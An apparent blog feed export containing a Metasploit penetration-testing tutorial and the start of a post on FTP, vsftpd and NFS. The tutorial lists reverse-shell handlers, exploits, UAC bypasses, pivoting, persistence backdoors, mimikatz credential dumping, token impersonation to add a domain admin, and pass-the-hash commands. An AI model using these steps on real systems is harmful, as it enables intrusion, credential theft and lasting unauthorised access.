<p>While configuring exploit handler, you can set initial steps for meterpreter, like migrating to a normal process immediately, or set it to communicate using encoded messages.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; show advanced      </span><br><span class="line"><span class="comment"># show options</span></span><br><span class="line">Module advanced options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name                    Current Setting  Required  Description</span><br><span class="line">   ----                    ---------------  --------  -----------</span><br><span class="line">   ContextInformationFile                   no        The information file that contains context information</span><br><span class="line">   DisablePayloadHandler   <span class="literal">false</span>            no        Disable the handler code <span class="keyword">for</span> the selected payload</span><br><span class="line">   EnableContextEncoding   <span class="literal">false</span>            no        Use transient context when encoding payloads</span><br><span class="line">   ExitOnSession           <span class="literal">true</span>             yes       Return from the exploit after a session has been created</span><br><span class="line">   ListenerTimeout         0                no        The maximum number of seconds to <span class="built_in">wait</span> <span class="keyword">for</span> new sessions</span><br><span class="line">   VERBOSE                 <span class="literal">false</span>            no        Enable detailed status messages</span><br><span class="line">   WORKSPACE                                no        Specify the workspace <span class="keyword">for</span> this module</span><br><span class="line">   WfsDelay                0                no        Additional delay when waiting <span class="keyword">for</span> a session</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload advanced options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name                         Current Setting  Required  Description</span><br><span class="line">   ----                         ---------------  --------  -----------</span><br><span class="line">   AutoLoadStdapi               <span class="literal">true</span>             yes       Automatically load the Stdapi extension</span><br><span class="line">   AutoRunScript                                 no        A script to run automatically on session creation.</span><br><span class="line">   ...</span><br><span class="line"><span class="comment"># set some options</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> AutoRunScript <span class="string">&quot;migrate -n explorer.exe&quot;</span></span><br><span class="line">AutoRunScript =&gt; migrate -n explorer.exe</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> InitialAutoRunScript <span class="string">&quot;screenshot&quot;</span></span><br><span class="line">InitialAutoRunScript =&gt; screenshot</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line"><span class="comment"># increase logging</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; setg LogLevel 5</span><br><span class="line">LogLevel =&gt; 5</span><br><span class="line"><span class="comment"># log file at ~/.msf4/logs/framework.log, use `debug` to get quick diagnosis</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; debug</span><br></pre></td></tr></table></figure>
<p>Better use encrypted communication channel like:</p>
<ul>
<li>meterpreter&#x2F;reverse_winhttps</li>
<li>meterpreter&#x2F;reverse_https</li>
<li>meterpreter&#x2F;reverse_tcp_rc4</li>
<li>meterpreter&#x2F;bind_tcp_rc4</li>
</ul>
<p>Go to <code>help</code> page for more options.</p>
<h2 id="How-to-use-modules"><a href="#How-to-use-modules" class="headerlink" title="How to use modules"></a>How to use modules</h2><p>First of all we have to get an aim, take <code>ms18_8120_win32k_privesc</code> as an example.</p>
<h3 id="Use-Modules"><a href="#Use-Modules" class="headerlink" title="Use Modules"></a><code>Use</code> Modules</h3><p>Search it in msfconsole, and select it</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; search ms18</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                               Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                               ---------------  ----    -----  -----------</span><br><span class="line">   ...</span><br><span class="line">   2  exploit/windows/<span class="built_in">local</span>/ms18_8120_win32k_privesc     2018-05-09       good    No     Windows SetImeInfoEx Win32k NULL Pointer Dereference</span><br><span class="line">   ...</span><br><span class="line">msf &gt; use exploit/windows/<span class="built_in">local</span>/ms18_8120_win32k_privesc</span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/ms18_8120_win32k_privesc) &gt; </span><br></pre></td></tr></table></figure>
<p>Now we are in <code>ms18_8120_win32k_privesc</code> context, and we can use <code>info</code> to see descriptions.</p>
<h3 id="Set-Options"><a href="#Set-Options" class="headerlink" title="Set Options"></a><code>Set</code> Options</h3><p>If you are familiar with it, then use <code>show options</code> and <code>set</code> to see options and set.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf exploit(windows/<span class="built_in">local</span>/ms18_8120_win32k_privesc) &gt; show options  </span><br><span class="line"><span class="comment"># or `show missing`, see options to set</span></span><br><span class="line"><span class="comment"># `show advanced` for high-level usage</span></span><br><span class="line">Module options (exploit/windows/<span class="built_in">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">msf exploit(windows/<span class="built_in">local</span>/ms18_8120_win32k_privesc) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br></pre></td></tr></table></figure>
<p>This module depends on <code>meterpreter</code>, so we dont need to set <code>payload</code> for it, while modules like <code>ms08_067_netapi</code> not.</p>
<h3 id="Set-Payload"><a href="#Set-Payload" class="headerlink" title="Set Payload"></a><code>Set</code> Payload</h3><p>Modules like <code>ms08_067_netapi</code> need to set a payload to let target provides a reverse <code>meterpreter</code> or shell.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show payloads </span><br><span class="line">                                                                              </span><br><span class="line">Compatible Payloads           </span><br><span class="line">===================       </span><br><span class="line">   <span class="comment">#    Name                            Disclosure Date  Rank    Check  Description </span></span><br><span class="line">   -    ----                            ---------------  ----    -----  ----------- </span><br><span class="line">   ...</span><br><span class="line">   44   windows/meterpreter/reverse_tcp                  normal  No     ........... <span class="comment"># common</span></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; show options </span><br><span class="line">...</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="built_in">set</span> lhost x.x.x.x</span><br><span class="line">lhost =&gt; x.x.x.x</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; xxxx</span><br></pre></td></tr></table></figure>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Finally type <code>run</code> or <code>exploit</code> to attack.</p>
<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><p>Before attacking, firstly we have to gather info.</p>
<h3 id="Built-in-module"><a href="#Built-in-module" class="headerlink" title="Built-in module"></a>Built-in module</h3><p>Just search string and you can find scanner you like.<br>Here I give some examples.<br>Scan host and port</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">auxiliary/scancer/smb/smb_version </span><br><span class="line">auxiliary/scanner/smb/smb_enumshares</span><br><span class="line">auxiliary/scanner/portscan/syn  </span><br><span class="line">auxiliary/scanner/portscan/tcp</span><br><span class="line">auxiliary/scanner/rdp/rdp_scanner </span><br><span class="line">auxiliary/scanner/smtp/smtp_enum</span><br><span class="line">auxiliary/scanner/http/cert</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Gather target asset information</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">auxiliary/gather/enum_dns</span><br><span class="line">auxiliary/gather/searchengine_subdomains_collector</span><br><span class="line">auxiliary/gather/corpwatch_lookup_name  <span class="comment"># need api</span></span><br><span class="line">auxiliary/gather/censys_search          <span class="comment"># need api</span></span><br><span class="line">auxiliary/gather/shodan_search          <span class="comment"># need api</span></span><br><span class="line">auxiliary/gather/shodan_honeyscore      <span class="comment"># need api</span></span><br><span class="line">auxiliary/gather/search_email_collector</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Brute force login</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum   </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Scan services</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version <span class="comment"># find ftp(21)</span></span><br><span class="line">auxiliary/scanner/ssh/ssh_version <span class="comment"># find ssh(22)</span></span><br><span class="line">auxiliary/scanner/telnet/telnet_version <span class="comment"># find telnet(23)</span></span><br><span class="line">auxiliary/scanner/dns/dns_amp <span class="comment"># find dns(53)</span></span><br><span class="line">auxiliary/scanner/http/http_version <span class="comment"># find http(80)</span></span><br><span class="line">auxiliary/scanner/http/title <span class="comment"># scan http title</span></span><br><span class="line">auxiliary/scanner/smb/smb_version <span class="comment">#find smb(445)</span></span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump <span class="comment"># find SQLServer(1433)</span></span><br><span class="line">auxiliary/scanner/oracle/oracle_hashdump <span class="comment"># find oracle(1521)</span></span><br><span class="line">auxiliary/scanner/mysql/mysql_version <span class="comment"># find mysql(3306)</span></span><br><span class="line">auxiliary/scanner/rdp/rdp_scanner <span class="comment"># find RDP(3389)</span></span><br><span class="line">auxiliary/scanner/redis/redis_server <span class="comment"># find Redis(6379)</span></span><br><span class="line">auxiliary/scanner/db2/db2_version <span class="comment"># find db2(50000)</span></span><br><span class="line">auxiliary/scanner/netbios/nbname <span class="comment"># scan LAN host netbios name</span></span><br></pre></td></tr></table></figure>
<p>As for vulnerabilities scanner, search it by yourself.</p>
<h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p>Plenty parameters:</p>
<ol>
<li>Host scan</li>
</ol>
<ul>
<li><code>-sn</code> – ping to scan host  </li>
<li><code>-sA</code> – scan host using TCP ACK</li>
</ul>
<ol start="2">
<li>Port scan</li>
</ol>
<ul>
<li><code>-oX</code> – export scan report to <code>db_import</code>(mentioned above)</li>
<li><code>-sT</code> – scan ports using TCP three-way handshake</li>
<li><code>-sS</code> – scan ports using TCP SYN (more hidden)</li>
<li><code>-p</code>  – set port range, like <code>-p 1-65535</code></li>
<li><code>-sU</code> – scan UDP ports</li>
<li><code>-Pn</code> – no ping</li>
<li><code>-sF</code> – scan port using FIN (similar to <code>-sX</code>, <code>-sN</code>, but with different flag)</li>
</ul>
<ol start="3">
<li>Specific information</li>
</ol>
<ul>
<li><code>-O</code>  – recognize operation system</li>
<li><code>-sV</code> – produce port service version info </li>
<li><code>-A</code>  – comprehensive scan</li>
</ul>
<ol start="4">
<li>Disguise</li>
</ol>
<ul>
<li><code>-e</code>  – assign netcard</li>
<li><code>-S</code>  – disguise ip, must with <code>-e</code> and <code>-Pn</code> </li>
<li><code>-D</code>  – some other fake ip is needed</li>
</ul>
<p><code>db_nmap</code> can be used in <code>msfconsole</code> and store data right in msfdb.<br>Example:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --version-all 192.168.177.144 -p -</span><br><span class="line"><span class="comment"># &#x27;-sTV&#x27;  -- combination of &#x27;-sT&#x27; and &#x27;-sV&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;-T4&#x27;   -- speed up</span></span><br><span class="line"><span class="comment"># &#x27;-open&#x27; -- just display open port</span></span><br><span class="line"><span class="comment"># &#x27;--min-parallelism&#x27; -- concurrent number of packets </span></span><br><span class="line"><span class="comment"># &#x27;--version-all&#x27; -- try every version test on every port</span></span><br><span class="line"><span class="comment"># &#x27;-p -&#x27;  -- scan all ports</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>NSE(Nmap Script Engine)<br>You can find them in <code>/usr/share/nmap/scripts/</code>, and use like <code>nmap --script &lt;scriptname&gt; &lt;host ip&gt;</code><br>Example:<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf5 &gt; db_nmap --open -sTV -Pn -p 80,8020,8022,8080,8282,8383,8484,8585,9200 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup- </span><br><span class="line">finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,ssl-poodle,ssl-heartbleed,http-webdav-scan,h </span><br><span class="line">ttp-iis-webdav-vuln xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2>When you get a <code>meterpreter</code>, try <code>getsystem</code> is a direct method.<br>Here are several modules to bypass UAC. All the following base on having <code>meterpreter</code> as session 1.<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac  </span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_fodhelper</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_comhijack</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_eventvwr    </span><br></pre></td></tr></table></figure>
Furthermore, ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18-8120 can also be used.</li>
</ol>
<h2 id="Lateral-Movement-Routing"><a href="#Lateral-Movement-Routing" class="headerlink" title="Lateral Movement ( Routing )"></a>Lateral Movement ( Routing )</h2><p>We still need a <code>meterpreter</code> to do the following.<br>First we print the network</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; ipconfig/ifoncig    <span class="comment"># show ip</span></span><br><span class="line">meterpreter &gt; arp –a              <span class="comment"># show host in arp cache</span></span><br><span class="line">meterpreter &gt; route               <span class="comment"># print route</span></span><br><span class="line">meterpreter &gt; netstat -an         <span class="comment"># show connecting ports</span></span><br></pre></td></tr></table></figure>
<p>Then we add a route to msf</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets   </span><br><span class="line">meterpreter &gt; route add xx.xx.xx.xx 255.255.255.0 1  <span class="comment"># add route table    </span></span><br><span class="line">meterpreter &gt; run autoroute -s xx.xx.xx.xx/24 -n 255.255.255.0 <span class="comment"># add static route         </span></span><br><span class="line">meterpreter &gt; run autoroute -s xx.xx.xx.xx/24   <span class="comment"># add dynamic route</span></span><br><span class="line">meterpreter &gt; run autoroute -p                  <span class="comment"># view route</span></span><br><span class="line">meterpreter &gt; run autoroute -d -s x.x.x.x       <span class="comment"># delete route</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=xxx.xxx.xxx.xxx/24 <span class="comment"># scan hosts</span></span><br></pre></td></tr></table></figure>
<p>Or we do port forwarding</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 2222 -r 127.0.0.1 -p 3389</span><br><span class="line"><span class="comment"># listen local 2222 and transfer it to 127.0.0.1:3389</span></span><br></pre></td></tr></table></figure>
<p>Or we set <code>socks</code> proxy</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(server/socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Starting the socks4a proxy server</span><br></pre></td></tr></table></figure>

<h2 id="Pentest-Persistence"><a href="#Pentest-Persistence" class="headerlink" title="Pentest Persistence"></a>Pentest Persistence</h2><p><code>post</code> module provides a lot to use</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">post/windows/gather/checkvm </span><br><span class="line">post/windows/gather/enum_applications   </span><br><span class="line">post/windows/gather/enum_patches  </span><br><span class="line">post/windows/gather/enum_domain  </span><br><span class="line">post/windows/manage/killav       </span><br><span class="line">post/windows/manage/enable_rdp    </span><br><span class="line">post/windows/gather/enum_logged_on_users  </span><br><span class="line">post/windows/gather/credentials/windows_autologin  </span><br><span class="line">post/windows/manage/enable_rdp username=xxx password=xxx  </span><br></pre></td></tr></table></figure>
<p>We have <code>persistence</code> module to help.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit/windows/<span class="built_in">local</span>/persistence.</span><br><span class="line">[!] Example: run exploit/windows/<span class="built_in">local</span>/persistence OPTION=value [...]</span><br><span class="line">Meterpreter Script <span class="keyword">for</span> creating a persistent backdoor on a target host.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -A        Automatically start a matching exploit/multi/handler to connect to the agent</span><br><span class="line">    -L &lt;opt&gt;  Location <span class="keyword">in</span> target host to write payload to, <span class="keyword">if</span> none %TEMP% will be used.</span><br><span class="line">    -P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.</span><br><span class="line">    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)</span><br><span class="line">    -T &lt;opt&gt;  Alternate executable template to use</span><br><span class="line">    -U        Automatically start the agent when the User logs on</span><br><span class="line">    -X        Automatically start the agent when the system boots</span><br><span class="line">    -h        This <span class="built_in">help</span> menu</span><br><span class="line">    -i &lt;opt&gt;  The interval <span class="keyword">in</span> seconds between each connection attempt</span><br><span class="line">    -p &lt;opt&gt;  The port on <span class="built_in">which</span> the system running Metasploit is listening</span><br><span class="line">    -r &lt;opt&gt;  The IP of the system running Metasploit listening <span class="keyword">for</span> the connect back</span><br><span class="line"></span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">meterpreter &gt; run persistence -U -i 5 -p xxxx -r xx.xx.xx.xx</span><br><span class="line"><span class="comment"># -U  --  start after user login</span></span><br><span class="line"><span class="comment"># -i  --  set Intervals(seconds)</span></span><br><span class="line"><span class="comment"># -p  --  set port to connect</span></span><br><span class="line"><span class="comment"># -r  --  set host to connect</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit/windows/<span class="built_in">local</span>/persistence.</span><br><span class="line">[!] Example: run exploit/windows/<span class="built_in">local</span>/persistence OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">...</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KYhpRVsujDvJCry</span><br></pre></td></tr></table></figure>

<p>Another module <code>metsvc</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit/windows/<span class="built_in">local</span>/persistence.</span><br><span class="line">[!] Example: run exploit/windows/<span class="built_in">local</span>/persistence OPTION=value [...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -A        Automatically start a matching exploit/multi/handler to connect to the service</span><br><span class="line">    -h        This <span class="built_in">help</span> menu</span><br><span class="line">    -r        Uninstall an existing Meterpreter service (files must be deleted manually)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try exploit/windows/<span class="built_in">local</span>/persistence.</span><br><span class="line">[!] Example: run exploit/windows/<span class="built_in">local</span>/persistence OPTION=value [...]</span><br><span class="line">...</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

<h2 id="Steal-Credentials"><a href="#Steal-Credentials" class="headerlink" title="Steal Credentials"></a>Steal Credentials</h2><p>Still in <code>meterpreter</code>, we load <code>mimikatz</code> module to do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load                <span class="comment"># we can load a lot</span></span><br><span class="line">load espia       load kiwi        load powershell  load unhook</span><br><span class="line">load extapi      load lanattacks  load python      load winpmem</span><br><span class="line">load incognito   load peinjector  load sniffer     </span><br><span class="line">meterpreter &gt; load mimikatz  </span><br><span class="line">meterpreter &gt; run hashdump </span><br><span class="line">meterpreter &gt; msv                 <span class="comment"># get hash</span></span><br><span class="line">meterpreter &gt; kerberos            <span class="comment"># get plain</span></span><br><span class="line">meterpreter &gt; ssp                 <span class="comment"># get plain text</span></span><br><span class="line">meterpreter &gt; wdigest             <span class="comment"># get plain text in memory</span></span><br><span class="line">meterpreter &gt; tspkg</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes     <span class="comment"># get hash</span></span><br><span class="line">meterpreter &gt; mimikatz_command -f handle::list        <span class="comment"># list applications</span></span><br><span class="line">mimikatz_command -f service::list       <span class="comment"># list services</span></span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords     <span class="comment"># search password</span></span><br></pre></td></tr></table></figure>
<p>Or we forge token by <code>incognito</code> module</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use incognito     <span class="comment"># load token module</span></span><br><span class="line">meterpreter &gt; list_tokens -u    <span class="comment"># list token (&#x27;system&#x27; needed)</span></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">DD-03FAD19C565F\Administrator</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token DD-03FAD19C565F\\Administrator  <span class="comment"># steal the token of administrator, an extra slash is needed</span></span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user DD-03FAD19C565F\Administrator</span><br><span class="line">meterpreter &gt; add_user admin passwd -h domainserver_ip  <span class="comment"># add user to domain</span></span><br><span class="line">meterpreter &gt; add_group_user <span class="string">&quot;Domain Admins&quot;</span> admin -h domainserver_ip       <span class="comment"># add user to be domain admins</span></span><br></pre></td></tr></table></figure>
<h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a><code>Pass-The-Hash</code></h3><p>And we have <code>Pass-The-Hash</code>, which means we can login just using <code>LM-Hash</code> and <code>NTLM-Hash</code>.</p>
<p>In <code>msf</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; use  exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> lhost attacker_ip</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> rhost target_ip</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> smbuser Administrator</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> smbpass 6d181cfaad0258eaaad3b435b51404ee: 9d482ae1705fd48c581e20a4123fb0dc   </span><br><span class="line"><span class="comment"># `LM-Hash`: `NTLM-Hash`.</span></span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br></pre></td></tr></table></figure>
<p>Using <code>mimikatz</code> </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ntlm hash</span></span><br><span class="line">sekurlsa::pth /user:administrator /domain:target_ip /ntlm:9d482ae1705fd48c581e20a4123fb0dc</span><br></pre></td></tr></table></figure>
<p>Or we use regular user hash</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ntlm hash</span></span><br><span class="line">sekurlsa::pth /user:man /domain:192.168.222.131 /ntlm:3dbde697d71690a769204beb12283678</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>pentest</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>Some Network File Sharing Services</title>
    <url>/2020/05/29/2020-05-29-Some-Network-File-Sharing-Services/</url>
    <content><![CDATA[<h2 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h2><p>There are three storage types: </p>
<ol>
<li>Direct Attached Storage (DAS)</li>
<li>Network Attached Storage (NAS)</li>
<li>Storage Area Network (SAN)</li>
</ol>
<h3 id="DAS"><a href="#DAS" class="headerlink" title="DAS"></a>DAS</h3><p><img src="/imghost/snfss/das.png" alt="DAS"><br>Your own destop computer, with a large volumn disk attached, is a kind of Direct Attached Storage. </p>
<h3 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h3><p><img src="/imghost/snfss/nas.png" alt="NAS"><br>Now there are many routers that you can plug in external usb storage and then access the storage via LAN network, it is a kind of Network Attached Storage.</p>
<h3 id="SAN"><a href="#SAN" class="headerlink" title="SAN"></a>SAN</h3><p><img src="/imghost/snfss/san.png" alt="SAN"><br>It uses a special SAN Switch to be the gate of distributed storage device. This is suitable for big business companies.</p>
<h2 id="File-Transfer-Protocol"><a href="#File-Transfer-Protocol" class="headerlink" title="File Transfer Protocol"></a>File Transfer Protocol</h2><p><code>FTP</code> is a protocol based on C&#x2F;S, and a dual channel protocol: port 21 for command and port 20 for data connection.</p>
<p><img src="/imghost/snfss/ftp1.webp" alt="SAN"></p>
<p>From server side, <code>FTP</code> has two modes.</p>
<ul>
<li>PORT style<br>command:    client random port -&gt; server port 21<br>data:       client random port &lt;- server port 20<br>Client port to connect was negotiated in handshake of command tunnel.</li>
<li>PASV style<br>command:    client random port -&gt; server port 21<br>data:       client random port -&gt; server random port<br>Server port to connect was negotiated in handshake of command tunnel.</li>
</ul>
<p>Server command port is always 21. Server data port is fixed in normal.</p>
<p><img src="/imghost/snfss/ftp2.png" alt="SAN"></p>
<p>Example: in PASV style you get: <code>227 Entering Passive Mode (172,16,0,1,224,59)</code>, then server port to connect is: <code>224*256+59</code>.</p>
<h3 id="Softwares"><a href="#Softwares" class="headerlink" title="Softwares"></a>Softwares</h3><p>Server side:</p>
<ul>
<li>Wu-ftpd</li>
<li>Proftpd</li>
<li>Pureftpd</li>
<li>Filezilla Server</li>
<li>Serv-U</li>
<li>Wing FTP Server</li>
<li>IIS</li>
<li>Very Secure FTP Daemon (vsftpd, popular)</li>
</ul>
<p>Client side:</p>
<ul>
<li>ftp </li>
<li>lftp</li>
<li>lftpget</li>
<li>wget</li>
<li>curl</li>
<li>browser</li>
</ul>
<h3 id="Very-Secure-FTP-Daemon"><a href="#Very-Secure-FTP-Daemon" class="headerlink" title="Very Secure FTP Daemon"></a>Very Secure FTP Daemon</h3><p><code>vsftp</code> is a relatively popular <code>FTP</code> server program.<br>Service to start:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/systemd/system/vsftpd.service</span><br><span class="line">/etc/rc.d/init.d/vsftpd</span><br></pre></td></tr></table></figure>
<p>Start the Service:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ systemctl start vsftpd</span><br></pre></td></tr></table></figure>
<p>Config file location:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure>

<p>Configuration items:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POST style    (windows client as default)</span></span><br><span class="line">connect_from_port_20=YES    <span class="comment"># confirm port 20</span></span><br><span class="line">ftp_data_port=20            <span class="comment"># assign another port rather than 20</span></span><br><span class="line"><span class="comment"># PASV style    (linux client as default)</span></span><br><span class="line">pasv_min_port=6000          <span class="comment"># from 6000</span></span><br><span class="line">pasv_max_port=6010          <span class="comment"># to 6010</span></span><br><span class="line"></span><br><span class="line">use_localtime=YES           <span class="comment"># `No` by default, which is using GMT</span></span><br><span class="line">anonymous_enable=YES        <span class="comment"># `No` by default in CentOS8</span></span><br><span class="line">no_anon_password=YES        <span class="comment"># annoymous need no passwd</span></span><br><span class="line">anon_upload_enable=YES      <span class="comment"># upload priv</span></span><br><span class="line">anon_mkdir_write_enable=YES <span class="comment"># mkdir priv</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Network-File-System"><a href="#Network-File-System" class="headerlink" title="Network File System"></a>Network File System</h2><p>Network File System (<code>NFS</code>) is a distributed file system protocol originally developed by Sun Microsystems (<code>Sun</code>) in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed.<br><img src="/imghost/snfss/nfs1.jpg" alt="NFS"><br><code>NFS</code>, like many other protocols, builds on the Open Network Computing Remote Procedure Call (<code>ONC RPC</code>) system, fits C&#x2F;S architecture.<br><img src="/imghost/snfss/nfs2.jpg" alt="NFS"><br>The <code>NFS</code> is an open standard defined in a Request for Comments (<code>RFC</code>), allowing anyone to implement the protocol.</p>
